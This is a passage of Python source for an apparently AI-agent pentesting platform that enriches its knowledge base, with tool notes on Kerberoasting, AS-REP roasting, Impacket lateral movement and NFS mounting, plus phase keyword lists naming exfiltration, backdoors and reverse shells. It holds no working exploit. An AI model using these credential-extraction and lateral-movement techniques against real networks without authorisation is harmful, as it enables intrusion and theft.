        when_to_use="Complex web fuzzing beyond directories. Fuzz parameters: wfuzz -z file,wordlist -d 'user=FUZZ&pass=test' url.",
        related_tools=["ffuf", "gobuster", "burpsuite"],
        agents=["red"],
        tags=["web", "fuzzing"],
    ),
    "rpcclient": ToolReasoning(
        reasoning="RPC client for SMB enumeration. Enumerates users, groups, shares, and password policies via MS-RPC.",
        description="MS-RPC client for Windows enumeration. Queries users, groups, shares, and domain information.",
        phase="ENUMERATION",
        when_to_use="SMB enumeration via RPC. rpcclient -U '' target for null session. enumdomusers, enumdomgroups for user/group listing.",
        related_tools=["enum4linux", "smbclient", "crackmapexec"],
        agents=["scout"],
        tags=["smb", "windows", "rpc"],
    ),
    "mount": ToolReasoning(
        reasoning="Mount remote filesystems (NFS, SMB) locally. Access files on the target as if they were local. Essential for NFS exploitation.",
        description="Mount filesystems. Used to mount NFS/SMB shares for file access during pentesting.",
        phase="EXPLOITATION",
        when_to_use="Mount NFS exports: mount -t nfs target:/share /mnt/target. Mount SMB: mount -t cifs //target/share /mnt.",
        related_tools=["showmount", "smbclient", "nfs"],
        agents=["red"],
        tags=["file-access", "nfs", "smb"],
    ),
    "hping3": ToolReasoning(
        reasoning="TCP/IP packet assembler and analyzer. Craft custom packets for firewall testing, port scanning, and network testing.",
        description="Network tool for sending custom TCP/IP packets. Port scanning, firewall testing, and network diagnostics.",
        phase="RECON",
        when_to_use="Custom packet crafting for firewall testing. SYN scanning without nmap: hping3 -S target -p 80.",
        related_tools=["nmap", "scapy"],
        agents=["scout", "shadow"],
        tags=["network", "packets"],
    ),
    "scapy": ToolReasoning(
        reasoning="Python packet manipulation library. Craft, send, and receive any type of network packet. The ultimate tool for custom protocol testing.",
        description="Interactive packet manipulation program. Forge, send, decode, and capture network packets.",
        phase="EXPLOITATION",
        when_to_use="Custom packet crafting for unusual protocols, IDS evasion, or packet-level exploitation.",
        related_tools=["hping3", "nmap", "tcpdump"],
        agents=["red", "shadow"],
        tags=["network", "packets", "python"],
    ),
    "impacket-getTGT": ToolReasoning(
        reasoning="Request Kerberos TGT with known credentials. First step for Kerberos-based attacks like pass-the-ticket and silver/golden ticket forging.",
        description="Impacket tool for requesting Kerberos Ticket Granting Tickets using known credentials.",
        phase="EXPLOITATION",
        when_to_use="After getting AD credentials. Request TGT for pass-the-ticket attacks or as stepping stone for other Kerberos abuse.",
        related_tools=["rubeus", "impacket-secretsdump", "mimikatz"],
        agents=["red"],
        tags=["ad", "kerberos"],
    ),
    "impacket-smbexec": ToolReasoning(
        reasoning="Stealthier than psexec. Executes commands via SMB without dropping a binary. Uses a temporary service with cmd.exe.",
        description="Impacket SMB-based command execution. Semi-interactive shell through SMB service creation.",
        phase="EXPLOITATION",
        when_to_use="Alternative to psexec when you want to avoid dropping binaries. Requires admin creds.",
        related_tools=["impacket-psexec", "impacket-wmiexec", "crackmapexec"],
        agents=["red"],
        tags=["ad", "lateral-movement"],
    ),
    "impacket-dcomexec": ToolReasoning(
        reasoning="Remote execution via DCOM. Alternative lateral movement technique that uses different Windows protocols than psexec/wmiexec.",
        description="Impacket DCOM-based remote command execution. Uses DCOM protocol for lateral movement.",
        phase="EXPLOITATION",
        when_to_use="Alternative lateral movement when SMB-based methods are blocked. Uses DCOM MMC20.Application.",
        related_tools=["impacket-psexec", "impacket-wmiexec", "crackmapexec"],
        agents=["red"],
        tags=["ad", "lateral-movement", "dcom"],
    ),
    "GetNPUsers.py": ToolReasoning(
        reasoning="Impacket AS-REP Roasting. Finds AD accounts without Kerberos pre-authentication and extracts their hashes for offline cracking.",
        description="Impacket tool for AS-REP Roasting. Extracts TGT hashes from accounts without Kerberos pre-authentication.",
        phase="EXPLOITATION",
        when_to_use="AD with accounts that have 'Do not require Kerberos pre-authentication' set. Extract hashes for offline cracking with hashcat.",
        related_tools=["rubeus", "hashcat", "impacket-getTGT"],
        agents=["red"],
        tags=["ad", "kerberos", "credentials"],
    ),
    "GetUserSPNs.py": ToolReasoning(
        reasoning="Impacket Kerberoasting. Requests service tickets for AD service accounts and extracts TGS hashes for offline cracking.",
        description="Impacket Kerberoasting tool. Extracts TGS hashes for service accounts in Active Directory.",
        phase="EXPLOITATION",
        when_to_use="AD enumeration with valid creds. Find service accounts and extract their hashes: GetUserSPNs.py domain/user:pass -request.",
        related_tools=["rubeus", "hashcat", "bloodhound"],
        agents=["red"],
        tags=["ad", "kerberos", "credentials"],
    ),
}
# fmt: on

# ─── Phase Inference Rules ──────────────────────────────────────────────────

PHASE_KEYWORDS: Dict[str, List[str]] = {
    "RECON": ["scan", "discover", "ping", "sweep", "fingerprint", "detect", "enumerate host",
              "osint", "whois", "dns", "subdomain", "recon", "information gathering"],
    "ENUMERATION": ["enumerate", "list", "brute-force dir", "fuzzing", "version",
                    "banner", "user enum", "share", "ldap", "snmp", "smb", "nfs",
                    "directory", "spider", "crawl"],
    "EXPLOITATION": ["exploit", "inject", "attack", "rce", "shell", "reverse",
                     "payload", "overflow", "sqli", "xss", "lfi", "rfi",
                     "deserialization", "upload", "bypass", "authentication",
                     "brute-force login", "credential", "password attack"],
    "PRIVILEGE_ESCALATION": ["privesc", "privilege", "escalat", "suid", "sudo",
                            "kernel", "root", "admin", "capability", "cron",
                            "writable", "setuid", "token"],
    "LATERAL_MOVEMENT": ["lateral", "pivot", "tunnel", "proxy", "psexec",
                         "wmiexec", "winrm", "pass-the-hash", "relay", "pth"],
    "POST_EXPLOITATION": ["post-exploit", "dump", "extract", "exfil", "persist",
                          "backdoor", "collect", "harvest", "loot", "crack hash",
                          "cleanup", "maintain access"],
    "EXFILTRATION": ["exfiltrat", "transfer out", "data steal", "archive and send",
                     "compress and upload"],
}

AGENT_KEYWORDS: Dict[str, List[str]] = {
    "red": ["exploit", "attack", "shell", "payload", "inject", "rce",
            "brute-force", "crack", "privesc", "lateral", "dump", "backdoor"],
    "scout": ["scan", "discover", "enumerate", "fingerprint", "recon",
              "directory", "version", "banner", "dns", "osint"],
    "blue": ["defend", "block", "firewall", "detect", "alert", "ids",
             "monitor", "harden", "patch", "honeypot"],
    "shadow": ["stealth", "evade", "encrypt", "obfuscate", "hide",
               "decoy", "timing", "slow scan", "anonymize"],
    "orion": ["strategy", "coordinate", "plan", "assess", "review",
              "prioritize", "direct"],
}


# =============================================================================
# Knowledge Enricher Class
# =============================================================================

class KnowledgeEnricher:
    """
    Post-processing enricher for knowledge base JSON files.
    
    Fills empty reasoning, description, phase, and when_to_use fields using:
    1. TOOL_REASONING_MAP — curated enrichment for ~350 known pentesting tools
    2. Phase inference from keywords in command/description text
    3. Agent inference from tool type and context
    4. Garbage filtering — removes LICENSE/noise entries
    5. Synthetic description generation from available fields
    """

    def __init__(self, kb_dir: Optional[Path] = None):
        self.kb_dir = kb_dir or KB_DIR
        self.stats = {
            "total_entries": 0,
            "enriched_reasoning": 0,
            "enriched_description": 0,
            "enriched_phase": 0,
            "garbage_removed": 0,
            "files_processed": 0,
        }

    def enrich_all(self) -> Dict[str, Any]:
        """Enrich all knowledge base files."""
        start = time.time()
        logger.info("Starting knowledge base enrichment...")

        enrichment_map = {
            "commands.json": self._enrich_commands,
            "binaries.json": self._enrich_binaries,
            "services.json": self._enrich_services,
            "techniques.json": self._enrich_techniques,
            "cves.json": self._enrich_cves,
            "kill_chains.json": self._enrich_kill_chains,
            "payloads.json": self._enrich_payloads,
            "ad_attacks.json": self._enrich_ad_attacks,
            "cloud_attacks.json": self._enrich_cloud_attacks,
            "privesc_linux.json": self._enrich_privesc,
            "privesc_windows.json": self._enrich_privesc,
            "privesc_checks.json": self._enrich_privesc_checks,
            "methodology.json": self._enrich_methodology,
            "cheatsheets.json": self._enrich_cheatsheets,
            "wordlists_meta.json": self._enrich_wordlists,
            "ctf_writeups.json": self._enrich_ctf_writeups,
        }

        for filename, enricher_fn in enrichment_map.items():
            fpath = self.kb_dir / filename
            if not fpath.exists():
                logger.warning(f"  Skipping {filename} — not found")
                continue

            try:
                with open(fpath, "r", encoding="utf-8") as f:
                    data = json.load(f)

                if not isinstance(data, list):
                    logger.info(f"  Skipping {filename} — not a list")
                    continue

                original_count = len(data)
                enriched = enricher_fn(data)

                # Write back
                with open(fpath, "w", encoding="utf-8") as f:
                    json.dump(enriched, f, indent=1, ensure_ascii=False, default=str)

                self.stats["files_processed"] += 1
                logger.info(f"  {filename}: {original_count} → {len(enriched)} entries")

            except Exception as e:
                logger.error(f"  {filename} enrichment failed: {e}")

        duration = round(time.time() - start, 1)
        self.stats["duration_seconds"] = duration

        logger.info(
            f"\nEnrichment complete in {duration}s:\n"
            f"  Files processed:      {self.stats['files_processed']}\n"
            f"  Total entries:        {self.stats['total_entries']:,}\n"
            f"  Enriched reasoning:   {self.stats['enriched_reasoning']:,}\n"
            f"  Enriched description: {self.stats['enriched_description']:,}\n"
            f"  Enriched phase:       {self.stats['enriched_phase']:,}\n"
            f"  Garbage removed:      {self.stats['garbage_removed']:,}"
        )
        return self.stats

    # ─── File-Specific Enrichers ────────────────────────────────────────

    def _enrich_commands(self, data: List[Dict]) -> List[Dict]:
        """Enrich commands.json — the largest file (~31K entries)."""
        enriched = []
        for entry in data:
            self.stats["total_entries"] += 1
            tool = entry.get("tool_name", "")

            # Garbage filter
            if self._is_garbage_command(entry):
                self.stats["garbage_removed"] += 1
                continue

            # Try TOOL_REASONING_MAP first
            tool_lower = tool.lower().strip()
            # Try exact match, then prefix match (e.g., "nmap" matches "nmap_quick_scan")
            tool_info = TOOL_REASONING_MAP.get(tool_lower)
            if not tool_info:
                # Try base tool name (before underscore/hyphen)
                base = tool_lower.split("_")[0].split("-")[0].split(".")[0]
                tool_info = TOOL_REASONING_MAP.get(base)

            if tool_info:
                if not entry.get("reasoning"):
                    entry["reasoning"] = tool_info.reasoning
                    self.stats["enriched_reasoning"] += 1
                if not entry.get("description"):
                    entry["description"] = tool_info.description
                    self.stats["enriched_description"] += 1
                if not entry.get("phase") or entry["phase"] == "GENERAL":
                    entry["phase"] = tool_info.phase
                    self.stats["enriched_phase"] += 1
                if not entry.get("use_case"):
                    entry["use_case"] = tool_info.when_to_use
            else:
                # Infer from context
                if not entry.get("reasoning"):
                    reasoning = self._infer_reasoning(entry)
                    if reasoning:
                        entry["reasoning"] = reasoning
                        self.stats["enriched_reasoning"] += 1

                if not entry.get("description") and entry.get("command"):
                    desc = self._generate_description(entry)
                    if desc:
                        entry["description"] = desc
                        self.stats["enriched_description"] += 1

                if not entry.get("phase") or entry["phase"] == "GENERAL":
                    phase = self._infer_phase(entry)
                    if phase:
                        entry["phase"] = phase
                        self.stats["enriched_phase"] += 1

            enriched.append(entry)

        return enriched

    def _enrich_binaries(self, data: List[Dict]) -> List[Dict]:
        """Enrich binaries.json (GTFOBins/LOLBAS entries)."""
        for entry in data:
            self.stats["total_entries"] += 1
            binary = entry.get("binary_name", "").lower()

            if not entry.get("reasoning"):
                functions = entry.get("functions", [])
                func_types = [f.get("type", "") for f in functions if isinstance(f, dict)]
                platform = entry.get("platform", "linux")

                if func_types:
                    func_str = ", ".join(set(func_types))
                    entry["reasoning"] = (
                        f"{'GTFOBins' if platform == 'linux' else 'LOLBAS'} abuse vector. "
                        f"'{binary}' can be leveraged for: {func_str}. "
                        f"If this binary is available via sudo, SUID, or capabilities, "
                        f"it may be exploitable for privilege escalation or security bypass."
                    )
                    self.stats["enriched_reasoning"] += 1

                    # Also enrich function descriptions if empty
                    for func in functions:
                        if isinstance(func, dict) and not func.get("description"):
                            ftype = func.get("type", "")
                            func["description"] = self._gtfobins_function_desc(binary, ftype)

        return data

    def _enrich_services(self, data: List[Dict]) -> List[Dict]:
        """Enrich services.json."""
        for entry in data:
            self.stats["total_entries"] += 1
            service = entry.get("service_name", "").lower()
            port = entry.get("port", 0)

            if not entry.get("reasoning"):
                tool_info = TOOL_REASONING_MAP.get(service)
                if tool_info:
                    entry["reasoning"] = tool_info.reasoning
                    self.stats["enriched_reasoning"] += 1
                else:
                    # Generate from available context
                    reasoning = self._infer_service_reasoning(entry)
                    if reasoning:
                        entry["reasoning"] = reasoning
                        self.stats["enriched_reasoning"] += 1

            if not entry.get("kill_chain_phase"):
                entry["kill_chain_phase"] = "ENUMERATION"
                self.stats["enriched_phase"] += 1

        return data

    def _enrich_techniques(self, data: List[Dict]) -> List[Dict]:
        """Enrich techniques.json (MITRE ATT&CK + Atomic Red Team)."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                tid = entry.get("technique_id", "")
                name = entry.get("technique_name", "")
                tactic = entry.get("tactic", "")
                desc = entry.get("description", "")

                if tid and name:
                    entry["reasoning"] = (
                        f"MITRE ATT&CK {tid}: {name}. "
                        f"{'Tactic: ' + tactic + '. ' if tactic else ''}"
                        f"Understanding this technique helps identify attack patterns and develop detection rules. "
                        f"{'Use the atomic tests to validate detection capabilities.' if entry.get('atomic_tests') else ''}"
                    )
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_cves(self, data: List[Dict]) -> List[Dict]:
        """Enrich cves.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                cve_id = entry.get("cve_id", "")
                desc = entry.get("description", "")
                severity = entry.get("severity", "")
                affected = entry.get("affected_software", "")
                msf_module = entry.get("metasploit_module", "")

                parts = []
                if cve_id:
                    parts.append(f"Vulnerability {cve_id}")
                if affected:
                    parts.append(f"affecting {affected}")
                if severity and severity != "unknown":
                    parts.append(f"(severity: {severity})")
                parts.append(".")
                if msf_module:
                    parts.append(f"Metasploit module available: {msf_module}.")
                if desc:
                    parts.append(f"Check if target runs affected versions before attempting exploitation.")

                if parts:
                    entry["reasoning"] = " ".join(parts)
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_kill_chains(self, data: List[Dict]) -> List[Dict]:
        """Enrich kill_chains.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                target = entry.get("target_service", "")
                port = entry.get("target_port", 0)
                result = entry.get("end_result", "")
                steps = entry.get("steps", [])

                if target or steps:
                    entry["reasoning"] = (
                        f"Complete exploitation chain for {target}"
                        f"{' on port ' + str(port) if port else ''}. "
                        f"{'Achieves: ' + result + '. ' if result else ''}"
                        f"Follow the {len(steps)}-step sequence from recon to exploitation. "
                        f"Each step builds on the previous — skipping steps may cause failures."
                    )
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_payloads(self, data: List[Dict]) -> List[Dict]:
        """Enrich payloads.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                vtype = entry.get("vuln_type", "")
                target_tech = entry.get("target_tech", "")
                bypass = entry.get("bypass_technique", "")

                if vtype:
                    entry["reasoning"] = (
                        f"{'Payload for ' + vtype.upper() + ' vulnerability. ' if vtype else ''}"
                        f"{'Targets ' + target_tech + ' applications. ' if target_tech else ''}"
                        f"{'Uses bypass technique: ' + bypass + '. ' if bypass else ''}"
                        f"Test in a controlled environment first. Modify payload for target-specific filters."
                    )
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_ad_attacks(self, data: List[Dict]) -> List[Dict]:
        """Enrich ad_attacks.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                name = entry.get("attack_name", "")
                category = entry.get("category", "")
                tools = entry.get("tools_used", [])
                prereqs = entry.get("prerequisites", [])

                parts = [f"AD attack: {name}." if name else ""]
                if category:
                    parts.append(f"Category: {category}.")
                if tools:
                    parts.append(f"Tools: {', '.join(tools[:5])}.")
                if prereqs:
                    parts.append(f"Prerequisites: {', '.join(prereqs[:3])}.")
                parts.append("Ensure you have valid domain credentials before attempting.")

                entry["reasoning"] = " ".join(p for p in parts if p)
                self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_cloud_attacks(self, data: List[Dict]) -> List[Dict]:
        """Enrich cloud_attacks.json — already mostly enriched, just fill gaps."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                name = entry.get("attack_name", "")
                provider = entry.get("cloud_provider", "")
                category = entry.get("category", "")

                if name:
                    entry["reasoning"] = (
                        f"Cloud attack technique: {name}. "
                        f"{'Provider: ' + provider.upper() + '. ' if provider else ''}"
                        f"{'Category: ' + category + '. ' if category else ''}"
                        f"Validate cloud environment access and permissions before executing."
                    )
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_privesc(self, data: List[Dict]) -> List[Dict]:
        """Enrich privesc_linux.json and privesc_windows.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                # These entries vary in structure — try multiple field names
                name = (entry.get("technique", "") or entry.get("technique_name", "")
                        or entry.get("check_name", "") or entry.get("title", "")
                        or entry.get("attack_name", ""))
                commands = entry.get("commands", [])
                desc = entry.get("description", "")
                os_type = entry.get("os", "")

                parts = []
                if name:
                    parts.append(f"Privilege escalation technique: {name}.")
                if os_type:
                    parts.append(f"Target OS: {os_type}.")
                if commands:
                    parts.append(f"Has {len(commands)} associated commands.")
                if desc and len(desc) > 20:
                    # Extract first meaningful sentence from description
                    clean = re.sub(r'```[\s\S]*?```', '', desc)  # Remove code blocks
                    clean = re.sub(r'[#*`\n]+', ' ', clean).strip()
                    if clean and len(clean) > 10:
                        first_sent = clean[:200].rsplit('.', 1)[0] + '.' if '.' in clean[:200] else clean[:200]
                        parts.append(first_sent)
                parts.append("Run enumeration (linpeas/winpeas) to confirm applicability.")

                if parts:
                    entry["reasoning"] = " ".join(parts)
                    self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_privesc_checks(self, data: List[Dict]) -> List[Dict]:
        """Enrich privesc_checks.json (PEASS enumeration checks)."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                name = entry.get("check_name", "")
                platform = entry.get("platform", "")
                commands = entry.get("commands", [])
                source = entry.get("source", "")

                entry["reasoning"] = (
                    f"PEASS privesc check: {name}. "
                    f"{'Platform: ' + platform + '. ' if platform else ''}"
                    f"{'Runs ' + str(len(commands)) + ' check command(s). ' if commands else ''}"
                    f"{'Source: ' + source + '. ' if source else ''}"
                    f"This automated check identifies potential privilege escalation vectors."
                )
                self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_cheatsheets(self, data: List[Dict]) -> List[Dict]:
        """Enrich cheatsheets.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                topic = entry.get("tool_or_topic", "")
                section = entry.get("section", "")
                commands = entry.get("commands", [])

                entry["reasoning"] = (
                    f"Cheatsheet: {topic}"
                    f"{' — ' + section if section and section != topic else ''}. "
                    f"{'Contains ' + str(len(commands)) + ' commands. ' if commands else ''}"
                    f"Reference during enumeration and exploitation phases."
                )
                self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_wordlists(self, data: List[Dict]) -> List[Dict]:
        """Enrich wordlists_meta.json (SecLists metadata)."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                name = entry.get("name", "")
                category = entry.get("category", "")
                wtype = entry.get("type", "")
                lines = entry.get("line_count", 0)
                path = entry.get("path", "")

                # Determine specific use case from category/type
                use_cases = {
                    "Passwords": "password brute-forcing and credential spraying",
                    "Usernames": "username enumeration and authentication attacks",
                    "Discovery": "directory/file brute-forcing and content discovery",
                    "Fuzzing": "input fuzzing and vulnerability testing",
                    "pattern-matching": "pattern matching and content analysis",
                    "credentials": "credential-based attacks and default password testing",
                }
                use = use_cases.get(category, use_cases.get(wtype, "security testing"))

                entry["reasoning"] = (
                    f"SecLists wordlist: {name}. "
                    f"{'Category: ' + category + '. ' if category else ''}"
                    f"{'Contains ' + f'{lines:,}' + ' entries. ' if lines else ''}"
                    f"Use for {use}. "
                    f"Path in SecLists: {path}." if path else ""
                )
                self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_ctf_writeups(self, data: List[Dict]) -> List[Dict]:
        """Enrich ctf_writeups.json."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                name = entry.get("challenge_name", "")
                category = entry.get("category", "")
                difficulty = entry.get("difficulty", "")
                tools = entry.get("tools_used", [])

                entry["reasoning"] = (
                    f"CTF writeup: {name}. "
                    f"{'Category: ' + category + '. ' if category else ''}"
                    f"{'Difficulty: ' + difficulty + '. ' if difficulty else ''}"
                    f"{'Tools used: ' + ', '.join(tools[:5]) + '. ' if tools else ''}"
                    f"Study the solution steps to learn attack methodology and creative problem-solving."
                )
                self.stats["enriched_reasoning"] += 1

        return data

    def _enrich_methodology(self, data: List[Dict]) -> List[Dict]:
        """Enrich methodology.json — most already have reasoning."""
        for entry in data:
            self.stats["total_entries"] += 1

            if not entry.get("reasoning"):
                phase = entry.get("phase", "")
                title = entry.get("title", "")
                steps = entry.get("steps", [])

                if title:
                    entry["reasoning"] = (
                        f"Methodology: {title}. "
                        f"{'Phase: ' + phase + '. ' if phase else ''}"
                        f"{'Contains ' + str(len(steps)) + ' steps. ' if steps else ''}"
                        f"Follow the methodology steps in order for best results."
                    )
                    self.stats["enriched_reasoning"] += 1

        return data

    # ─── Helper Methods ─────────────────────────────────────────────────

    def _is_garbage_command(self, entry: Dict) -> bool:
        """Detect garbage entries (LICENSE fragments, markdown noise, etc.)."""
        tool = entry.get("tool_name", "")
        cmd = entry.get("command", "")
        desc = entry.get("description", "")

        # Empty tool name
        if not tool or not tool.strip():
            return True

        # Tool name is a markdown image/link
        if tool.startswith("!") or tool.startswith("[") or tool.startswith("http"):
            return True

        # Tool name contains emojis or special chars
        if any(ord(c) > 127 for c in tool):
            return True

        # Tool name is too long (real CLI tools are short)
        if len(tool) > 80:
            return True

        # Tool name starts with punctuation (except .)
        if tool[0] in "!@#$%^&*(){}[]<>|/\\~`+=,;:'\"":
            return True

        # LICENSE/copyright noise
        lower_tool = tool.lower()
        noise_words = {
            "creative", "commons", "copyright", "license", "mit", "apache",
            "gpl", "bsd", "redistribution", "permission", "granted",
            "warranty", "liability", "author", "contributors",
        }
        if lower_tool in noise_words:
            return True

        # Pure markdown artifacts
        if tool.startswith("##") or tool.startswith("**"):
            return True

        # YAML artifacts
        if tool.startswith("!!"):
            return True

        # Command is empty and description is empty
        if not cmd and not desc:
            return True

        return False

    def _infer_reasoning(self, entry: Dict) -> str:
        """Generate reasoning from available fields."""
        tool = entry.get("tool_name", "")
        cmd = entry.get("command", "")
        desc = entry.get("description", "")
        phase = entry.get("phase", "")
        use_case = entry.get("use_case", "")
        source = entry.get("source", "")

        # Build reasoning from what we have
        parts = []

        if desc and len(desc) > 10:
            parts.append(desc.rstrip(".") + ".")

        if use_case and use_case != desc and len(use_case) > 10:
            # Clean up markdown from use_case
            clean_uc = re.sub(r'[#*`]', '', use_case).strip()
            if clean_uc and len(clean_uc) > 10:
                parts.append(clean_uc.rstrip(".") + ".")

        if cmd and not parts:
            # Extract tool from command
            cmd_tool = cmd.split()[0] if cmd.split() else ""
            parts.append(f"Command using {cmd_tool}.")

        if phase and phase != "GENERAL":
            parts.append(f"Used during {phase.replace('_', ' ').lower()} phase.")

        if source:
            parts.append(f"Source: {source}.")

        return " ".join(parts) if parts else ""

    def _generate_description(self, entry: Dict) -> str:
        """Generate description from command text."""
        cmd = entry.get("command", "")
        tool = entry.get("tool_name", "")

        if not cmd:
            return ""

        # Extract the base command
        cmd_parts = cmd.split()
        if not cmd_parts:
            return ""

        base_cmd = cmd_parts[0]

        # Check TOOL_REASONING_MAP for the base command
        tool_info = TOOL_REASONING_MAP.get(base_cmd.lower())
        if tool_info:
            return tool_info.description

        # Generate basic description from command structure
        if len(cmd) < 200:
            return f"Executes '{base_cmd}' — {tool} command for security assessment."

        return f"Security assessment command using {tool or base_cmd}."

    def _infer_phase(self, entry: Dict) -> str:
        """Infer attack phase from text content."""
        text = " ".join([
            entry.get("tool_name", ""),
            entry.get("command", ""),
            entry.get("description", ""),
            entry.get("use_case", ""),
        ]).lower()

        if not text.strip():
            return ""

        # Score each phase by keyword matches
        scores: Dict[str, int] = {}
        for phase, keywords in PHASE_KEYWORDS.items():
            score = sum(1 for kw in keywords if kw in text)
            if score > 0:
                scores[phase] = score

        if scores:
            return max(scores, key=scores.get)

        return "GENERAL"

    def _infer_agents(self, entry: Dict) -> List[str]:
        """Infer which agents should use this entry."""
        text = " ".join([
            entry.get("tool_name", ""),
            entry.get("command", ""),
            entry.get("description", ""),
        ]).lower()

        agents = []
        for agent, keywords in AGENT_KEYWORDS.items():
            if any(kw in text for kw in keywords):
                agents.append(agent)

        return agents or ["red"]  # Default to red agent

    def _infer_service_reasoning(self, entry: Dict) -> str:
        """Generate reasoning for a service entry."""
        service = entry.get("service_name", "")
        port = entry.get("port", 0)
        vulns = entry.get("common_vulnerabilities", [])
        creds = entry.get("default_credentials", [])
        methodology = entry.get("methodology", "")

        parts = [f"Service: {service}"]
        if port:
            parts.append(f"on port {port}")
        parts.append(".")

        if creds:
            parts.append(f"Has {len(creds)} known default credential set(s) — always try these first.")
        if vulns:
            parts.append(f"Known vulnerabilities: {', '.join(vulns[:3])}.")
        if methodology:
            parts.append("Follow the enumeration methodology for this service.")

        return " ".join(parts)

    def _gtfobins_function_desc(self, binary: str, func_type: str) -> str:
        """Generate description for a GTFOBins function type."""
        descs = {
            "shell": f"If '{binary}' is available via sudo or SUID, it can be used to spawn an interactive shell, escalating privileges.",
            "file-read": f"'{binary}' can be leveraged to read arbitrary files when it has elevated permissions.",
            "file-write": f"'{binary}' can write to arbitrary files, potentially allowing modification of /etc/passwd or authorized_keys.",
            "file-upload": f"'{binary}' can upload files to remote locations, useful for data exfiltration.",
            "file-download": f"'{binary}' can download files from remote locations, useful for transferring tools to target.",
            "suid": f"If '{binary}' has the SUID bit set, it can be exploited for privilege escalation.",
            "sudo": f"If '{binary}' is allowed via sudo, it can be exploited to gain root shell access.",
            "capabilities": f"'{binary}' with specific Linux capabilities can be leveraged for privilege escalation.",
            "limited-suid": f"'{binary}' with SUID has limited but potentially exploitable elevated functionality.",
            "reverse-shell": f"'{binary}' can be used to establish a reverse shell connection back to the attacker.",
            "bind-shell": f"'{binary}' can be used to create a bind shell, listening for incoming connections.",
            "non-interactive-reverse-shell": f"'{binary}' can establish a non-interactive reverse shell.",
            "non-interactive-bind-shell": f"'{binary}' can create a non-interactive bind shell.",
        }
        return descs.get(func_type, f"'{binary}' can be used for {func_type} operations when available with elevated privileges.")


# =============================================================================
# ExploitDB Enricher — adds reasoning to ExploitDB entries
# =============================================================================

class ExploitDBEnricher:
    """Enrich ExploitDB entries with reasoning and context."""

    # Platform → typical attack approach
    PLATFORM_CONTEXT = {
        "linux": "Linux target — check for kernel version, distro, and running services",
        "windows": "Windows target — check for patch level, architecture (x86/x64), and service pack",
        "php": "PHP web application — test for RCE, LFI, file upload, and deserialization",
        "python": "Python application — check for eval(), pickle deserialization, SSTI, and import injection",
        "java": "Java application — test for deserialization, JNDI injection, and class loading",
        "ruby": "Ruby application — check for ERB injection, YAML deserialization, and command injection",
        "aspx": "ASP.NET application — test for viewstate deserialization, web.config disclosure",
        "multiple": "Cross-platform exploit — verify target OS and application version before use",
        "hardware": "Hardware/firmware exploit — may require physical access or specific hardware",
        "android": "Android mobile exploit — requires specific Android version and API level",
        "ios": "iOS exploit — requires specific iOS version and jailbreak status",
        "osx": "macOS exploit — check for specific macOS version and SIP status",
    }

    # Exploit type → context
    TYPE_CONTEXT = {
        "remote": "Remote exploit — can be triggered over the network without prior access",
        "local": "Local exploit — requires existing access to the target system (shell or credentials)",
        "webapps": "Web application exploit — target must be running the vulnerable web application",
        "dos": "Denial of service — causes service disruption, not code execution",
        "shellcode": "Shellcode payload — used as part of a larger exploit chain (buffer overflow, etc.)",
    }

    @staticmethod
    def enrich_exploitdb(entries: List[Dict]) -> List[Dict]:
        """Add reasoning and context to ExploitDB entries."""
        for entry in entries:
            if entry.get("reasoning"):
                continue

            edb_id = entry.get("edb_id", "")
            desc = entry.get("description", "")
            platform = entry.get("platform", "").lower()
            etype = entry.get("exploit_type", "").lower()
            port = entry.get("port", 0)
            cve = entry.get("cve", "")

            parts = [f"ExploitDB EDB-{edb_id}."]

            if etype:
                type_ctx = ExploitDBEnricher.TYPE_CONTEXT.get(etype, "")
                if type_ctx:
                    parts.append(type_ctx + ".")

            if platform:
                plat_ctx = ExploitDBEnricher.PLATFORM_CONTEXT.get(platform, "")
                if plat_ctx:
                    parts.append(plat_ctx + ".")

            if port and port > 0:
                parts.append(f"Targets port {port}.")

            if cve:
                parts.append(f"Associated with {cve} — search for advisory details and affected versions.")

            if desc:
                parts.append("Verify target runs the exact vulnerable version before attempting exploitation.")

            entry["reasoning"] = " ".join(parts)

        return entries


# =============================================================================
# CLI Entry Point
# =============================================================================

def main():
    """Run knowledge enrichment."""
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(name)s | %(levelname)s | %(message)s",
    )

    enricher = KnowledgeEnricher()

    if "--stats" in sys.argv:
        # Just show current stats
        for fname in sorted(KB_DIR.glob("*.json")):
            try:
                data = json.load(open(fname))
                if not isinstance(data, list):
                    continue
                total = len(data)
                empty_r = sum(1 for e in data if isinstance(e, dict) and e.get("reasoning", "") == "")
                empty_d = sum(1 for e in data if isinstance(e, dict) and e.get("description", "N/A") == "")
                print(f"  {fname.name}: {total} entries, empty_reasoning={empty_r}, empty_desc={empty_d}")
            except Exception:
                continue
        return

    if "--file" in sys.argv:
        idx = sys.argv.index("--file") + 1
        if idx < len(sys.argv):
            target = sys.argv[idx]
            if not target.endswith(".json"):
                target += ".json"
            # Run single file enrichment
            fpath = KB_DIR / target
            if fpath.exists():
                data = json.load(open(fpath))
                if isinstance(data, list):
                    enricher_map = {
                        "commands.json": enricher._enrich_commands,
                        "binaries.json": enricher._enrich_binaries,
                        "services.json": enricher._enrich_services,
